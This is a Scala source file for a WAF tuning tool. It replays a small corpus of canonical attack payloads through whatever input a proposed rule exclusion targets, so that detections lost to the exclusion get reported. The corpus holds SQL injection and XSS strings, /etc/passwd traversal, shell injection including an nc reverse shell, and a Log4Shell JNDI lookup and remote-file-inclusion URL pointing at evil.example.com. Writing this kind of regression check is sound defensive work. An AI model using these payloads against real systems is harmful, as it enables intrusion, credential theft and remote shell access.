package com.cloud.apim.otoroshi.extensions.waf.tuning

import com.cloud.apim.seclang.model.{Headers, RequestContext}

import java.net.URLEncoder
import java.nio.charset.StandardCharsets

/**
 * A handful of attacks the ruleset is expected to keep catching.
 *
 * The reason it exists: an exclusion is written to make one alert stop, and nothing in that act
 * tells the operator what else stopped with it. `SecRuleUpdateTargetById 942100 "!ARGS:query"` on a
 * search endpoint is a reasonable-looking line that hands the search box to anyone who asks. So
 * before an exclusion is offered, every one of these is replayed through the *same input the
 * exclusion targets* — and anything that stops being caught is reported as a consequence of the
 * change rather than discovered in an incident review.
 *
 * It is deliberately small and canonical. This is a safety check on one edit, not a test suite:
 * the point is to catch the obvious own-goal, and a payload nobody recognises would only produce
 * noise an operator learns to click through.
 */
object AttackCorpus {

  final case class Payload(name: String, category: String, value: String)

  /** A value no ruleset should object to, used as the "what does normal look like" baseline. */
  val benignValue: String = "hello world"

  val payloads: Seq[Payload] = Seq(
    Payload("sqli-tautology", "sqli", "1' OR '1'='1"),
    Payload("sqli-union", "sqli", "-1 UNION ALL SELECT NULL,NULL,version()--"),
    Payload("sqli-comment", "sqli", "admin'--"),
    Payload("xss-script", "xss", "<script>alert(1)</script>"),
    Payload("xss-handler", "xss", "\"><img src=x onerror=alert(1)>"),
    Payload("xss-javascript-uri", "xss", "javascript:alert(document.cookie)"),
    Payload("lfi-traversal", "lfi", "../../../../etc/passwd"),
    Payload("lfi-encoded", "lfi", "..%2f..%2f..%2fetc%2fpasswd"),
    Payload("rce-shell", "rce", "; cat /etc/passwd"),
    Payload("rce-backtick", "rce", "`id`"),
    Payload("rce-pipe", "rce", "| nc -e /bin/sh 10.0.0.1 4444"),
    Payload("rfi-remote", "rfi", "http://evil.example.com/shell.txt?"),
    Payload("java-deserialize", "java", "${jndi:ldap://evil.example.com/a}"),
    Payload("php-wrapper", "php", "php://filter/convert.base64-encode/resource=index.php"),
    Payload("scanner-ua", "scanner", "sqlmap/1.7#stable (http://sqlmap.org)")
  )

  /**
   * The corpus, delivered through one specific input.
   *
   * Placing every payload in the input the exclusion names is the whole point: an exclusion on
   * `ARGS:comment` is harmless to an attack arriving in `ARGS:id`, and testing it there would prove
   * nothing about what was actually given up.
   */
  def requests(target: MatchedTarget, method: String, path: String): Seq[(Payload, RequestContext)] =
    payloads.map(p => (p, requestFor(target, method, path, p.value)))

  /**
   * Percent-encoding, because the request line is itself inspected.
   *
   * A payload dropped raw into the URI produces `GET /x?q=1' or 1=1-- HTTP/1.1`, which is not a
   * valid request line — and the CRS says so, in phase 1, before the rule being tuned ever runs. On
   * a blocking configuration that ends evaluation there, so the probe reports "could not reproduce"
   * for every parameter match. The decoded value still goes in `query`, exactly as a gateway hands
   * it over.
   */
  private def form(s: String): String =
    URLEncoder.encode(s, StandardCharsets.UTF_8).replace("+", "%20")

  def requestFor(target: MatchedTarget, method: String, path: String, value: String): RequestContext = {
    val member = target.member.getOrElse("value")
    val base   = RequestContext(
      method = method.toUpperCase,
      uri = path,
      headers = Headers(Map("Host" -> List("tuning.local"), "User-Agent" -> List("cloud-apim-tuning"))),
      cookies = Map.empty,
      query = Map.empty,
      body = None,
      status = None,
      statusTxt = None,
      remoteAddr = "127.0.0.1",
      remotePort = 0,
      protocol = "http/1.1"
    )
    target.collection match {
      case "ARGS" | "ARGS_GET" | "ARGS_NAMES" | "ARGS_GET_NAMES" =>
        base.copy(query = Map(member -> List(value)), uri = s"$path?${form(member)}=${form(value)}")
      case "REQUEST_COOKIES" | "REQUEST_COOKIES_NAMES"           =>
        base.copy(cookies = Map(member -> List(value)))
      case "REQUEST_HEADERS" | "REQUEST_HEADERS_NAMES"           =>
        base.copy(headers = Headers(base.headers.underlying ++ Map(member -> List(value))))
      case "REQUEST_BODY" | "ARGS_POST" | "ARGS_POST_NAMES"      =>
        base.copy(
          method = "POST",
          headers = Headers(base.headers.underlying ++ Map("Content-Type" -> List("application/x-www-form-urlencoded"))),
          body = Some(com.cloud.apim.seclang.model.ByteString(s"${form(member)}=${form(value)}"))
        )
      case _                                                     =>
        base.copy(query = Map(member -> List(value)), uri = s"$path?${form(member)}=${form(value)}")
    }
  }
}
